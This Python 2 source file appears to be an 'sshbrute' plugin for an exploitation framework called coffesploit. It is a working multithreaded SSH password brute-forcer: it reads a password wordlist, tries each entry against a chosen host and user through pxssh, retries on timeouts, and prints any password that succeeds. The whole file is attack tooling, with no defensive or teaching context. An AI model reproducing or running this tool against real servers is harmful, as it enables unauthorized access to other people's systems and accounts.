#!/usr/bin/python
import pxssh
import time
from threading import *
from coffesploit.core.pluginmanage.exploitplugin import ExploitPlugin
from coffesploit.core.datamanager import DataManager


class SSHBrute(ExploitPlugin):
    def __init__(self):
        self.tool_name = "sshbrute"
        super(SSHBrute, self).__init__(self.tool_name)
        self.maxConnections = 5
        self.connection_lock = BoundedSemaphore(value=self.maxConnections)
        self.datamanager = DataManager()
        self.Found = False
        self.Fails = 0
        self.host = None
        self.passwdFile = self.datamanager.get_file("password")
        self.user = None

    def connect(self, host, user, password, release):
        try:
            s = pxssh.pxssh()
            s.login(host, user, password)
            print "[+] Password Found: " + password
            self.Found = True
        except Exception, e:
            if "read_nonblocking" in str(e):
                self.Fails += 1
                time.sleep(5)
                self.connect(host, user, password, False)
            elif "synchronize with original prompt" in str(e):
                time.sleep(1)
                self.connect(host, user, password, False)
        finally:
            if release:
                self.connection_lock.release()

    def status(self):
        return {'host': self.host,
                'user': self.user
                }
    def run(self):
        super(SSHBrute, self).run()
        if self.host == None or self.passwdFile == None or self.user == None:
            print "user and host need to be seted"
        fn = open(self.passwdFile, 'r')
        for line in fn.readlines():
            if self.Found:
                print "[*] Exiting: Password Found"
            if self.Fails > 5:
                print "[!] Exiting: Too Many Socket Timeouts"
                exit(0)
            self.connection_lock.acquire()
            password = line.strip('\r').strip('\n')
            print "[-] Testing: "+str(password)
            t = Thread(target=self.connect, args=(self.host, self.user, password, True))
            t.start()

    def set_args(self, *args):
        if len(args) == 2:
            if args[0] == 'host':
                self.host = args[1]
            if args[0] == 'user':
                self.user = args[1]
